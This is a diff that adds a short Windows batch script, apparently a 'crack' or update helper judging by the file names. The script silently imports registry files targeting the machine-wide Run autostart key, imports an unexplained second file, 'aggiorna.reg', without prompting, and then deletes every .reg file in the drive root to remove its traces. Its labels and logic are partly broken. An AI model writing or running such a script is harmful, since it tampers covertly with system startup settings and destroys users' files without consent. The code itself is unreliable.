@@ -1,0 +1,19 @@
+echo off
+echo.
+echo REGEDIT4 > c:\regCrk.reg
+echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]                                                       >> c:\regCrk.reg
+:loop
+c:\windows\regedit -s c:\regCrk.reg
+echo.
+echo.
+echo.
+c:\windows\regedit -s aggiorna.reg
+:Exit
+cls	
+goto end
+:Res
+cls
+:end
+del c:\*.reg
+cls
+exit
